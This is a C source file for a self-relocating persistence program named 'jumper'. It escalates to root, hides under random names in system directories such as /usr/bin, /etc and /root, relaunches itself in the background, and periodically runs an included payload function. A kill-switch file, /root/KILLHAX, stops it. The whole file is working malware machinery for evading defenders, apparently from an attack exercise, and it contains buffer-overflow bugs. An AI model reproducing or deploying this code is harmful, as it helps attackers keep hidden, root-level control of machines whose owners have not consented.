
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <sys/time.h>
#include <time.h>
#include <string.h>
#include "payload.c"

// Global parameters
#define SAVECPU 1
#define CLOCK 9
#define VERBOSE 0

#define FALSE 0
#define TRUE 1
#define ERROR -1
#define STOP "/root/KILLHAX"

char getnum(char *str){
    char ret = str[strlen(str)-1];
    return ret;
}

int isKill(){
    if (access(STOP, F_OK) == FALSE ) {
        //file exists
        return TRUE;
    }
    //file does not exist
    return FALSE;
}

void rand_str(char *dest, size_t length) {
    struct timeval te;
    gettimeofday(&te, NULL);
    srand((unsigned int)te.tv_usec);
    char charset[] = "0123456789"
                     "abcdefghijklmnopqrstuvwxyz"
                     "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    while (length-- > 0) {
        size_t index = (double) rand() / RAND_MAX * (sizeof charset - 1);
        *dest++ = charset[index];
    }
    *dest = '\0';
}

int go(int argc, char *argv[]){
    chown(argv[0], 0, 0);
    struct timeval te;
    gettimeofday(&te, NULL);
    srand((unsigned int)te.tv_usec);
    struct timespec ts;
    ts.tv_sec = 0;
    ts.tv_nsec = (rand()%100+50) * 1000000;
    nanosleep(&ts, &ts);
    //sleep(SLEEP);
    char paths[7][50] = {
        "/usr/local/",
        "/usr/bin/",
        "/etc/",
        "/var/lib/",
        "/usr/sbin/",
        "/root/",
        "/home/",
    };
    if (isKill() == TRUE){
        printf("Received emergency kill signal!\n");
        remove(argv[0]);
        return 1;
    }
    int string_len = 5;
    char str[] = { [5] = '\1' }; // make the last character non-zero so we can test based on it later
    rand_str(str, sizeof str - 1);
    assert(str[5] == '\0');      // test the correct insertion of string terminator
    //printf("%s\n", str);
    int i = -1;
    char *path = paths[rand()%6];
    strcat(path, str);
    if (SAVECPU) {
        int curNum;
        if (strcmp(argv[0], "./jumper") == 0){
            curNum = 0;
        } else {
            char curNumStr = getnum(argv[0]);
            curNum = atoi(&curNumStr);
        }
        
        if (curNum == CLOCK){
            curNum = 0;
            payload();
        } else {
            curNum += 1;
        }
        char tmpstr[1];
        sprintf(tmpstr, "%d", curNum);
        strcat(path, tmpstr);
    } else {
        payload();
    }
    if (VERBOSE){
        printf("Jumper is now at %s\n", path);
    }
    rename(argv[0], path);
    if( access( path, F_OK ) != 0 ) {
        return go(argc, argv);
    }
    strcat(path, " &");
    system(path);
    return TRUE;
}

int main(int argc, char *argv[]){
    setuid(0);
    return go(argc, argv);
}